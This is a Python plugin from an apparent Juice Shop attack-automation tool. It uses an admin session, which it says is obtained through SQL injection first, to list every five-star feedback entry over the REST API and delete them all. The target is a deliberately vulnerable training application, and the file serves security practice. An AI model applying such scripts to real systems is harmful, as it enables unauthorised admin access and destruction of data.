# SOURCE FILE:    fivestar_delete.py
# PROGRAM:        JuiceShop automating attack application -- Plugin
# FUNCTIONS:      Solve DELETE FIVESTAR Challenge
#                 login to admin and then delete all the five star
#          
# DATE:           Dec 6, 2022
# REVISIONS:      N/A
# PROGRAMMER:     Yoyo Wang
#
# NOTES
# RE: You need to have records of admin first.
# If not, please run SQL injection
#--------------------------------------------------------------------------------------

import time
from plugins import attack as a

#--------------------------------------------------------------------------------------
#Class: delete_fiveStar
#Inherit: Attack
#--------------------------------------------------------------------------------------
class delete_fiveStar():

#--------------------------------------------------------------------------------------
#FUNCTION: __init__ 
#ARGUMENTS: N/A
#RETURNS: void
#Description: Initial class variables
#--------------------------------------------------------------------------------------
    def __init__(self):
        # REST session
        self.juice_session = a.requests.session()
        # url to access feedback page
        self.url = a.URL + '/api/Feedbacks/'
        # get admin cookie and header
        self.generator()
        # target is all five star feedbacks.
        self.deleteStar = 5

#--------------------------------------------------------------------------------------
#FUNCTION generator
#ARGUMENTS: N/A
#RETURNS: N/A
#Description: This function is used to generate needed data from REST requests
#             
#NOTES:
#--------------------------------------------------------------------------------------
    def generator(self):
        try:
            new_cookie, new_header = a.get_auth("admin")
            self.cookie, self.header = new_cookie, new_header
        except:
            print("you do not have a record of admin, please try SQL injection first")

#--------------------------------------------------------------------------------------
#FUNCTION show_5StarList
#ARGUMENTS: N/A
#RETURNS: show_List  --> List of all five star feedbacks's id
#Description: Send a GET request to get all five feedbacks's corresponding ID 
#             
#NOTES:
#--------------------------------------------------------------------------------------
    def show_5StarList(self):
        response = self.juice_session.get(self.url,
                                          cookies=self.cookie, headers=self.header, verify=False)
        print(response.text)
        show_List = []
        for i in range(len(response.json()["data"])):
            item = response.json()["data"]
            if item[i]["rating"] == self.deleteStar:
                show_List.append(item[i]["id"])
        print(show_List)
        return show_List

#--------------------------------------------------------------------------------------
#FUNCTION show_5StarList
#ARGUMENTS: delete_list --> List of all five star feedbacks's id
#RETURNS: N/A
#Description: Send a DELETE request to delete all five feedbacks by ID 
#             
#NOTES:
#--------------------------------------------------------------------------------------
    def delete_allList(self, delete_list):
        for j in range(len(delete_list)):
            print(delete_list[j])
            res = self.juice_session.delete(a.URL + '/api/Feedbacks/{}'.format(str(delete_list[j])),
                                            cookies=self.cookie, headers=self.header, verify=False)
            print(res)

#--------------------------------------------------------------------------------------
#FUNCTION run
#ARGUMENTS: N/A
#RETURNS: N/A
#Description: This is the main function for plugin.
#             
#NOTES: None
#--------------------------------------------------------------------------------------
    def run(self):
        print("--------------------------------------------------------------")
        print("Now let us solve the challenge five star deleting ------------")
        a.logging.basicConfig(filename='./test_logging_info.log', 
                            level=a.logging.INFO, format='%(asctime)s %(message)s')
        a.logging.Formatter.converter = time.gmtime
        logger = a.logging.getLogger("Delete five star")
        a.logging.info(logger)
        a.logging.info('Started')
        delete_list = self.show_5StarList()
        self.delete_allList(delete_list)
        ##check deleting
        fiveStar_list = self.show_5StarList()
        print( len(fiveStar_list)==0 )
        a.logging.info('Finished')